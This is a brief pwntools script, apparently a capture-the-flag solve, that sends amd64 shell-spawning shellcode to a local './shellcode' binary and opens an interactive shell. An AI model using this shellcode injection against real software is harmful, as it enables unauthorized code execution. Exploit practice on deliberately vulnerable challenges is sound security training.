from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./shellcode')

r.sendlineafter(b': ', asm(shellcraft.sh()))

r.interactive()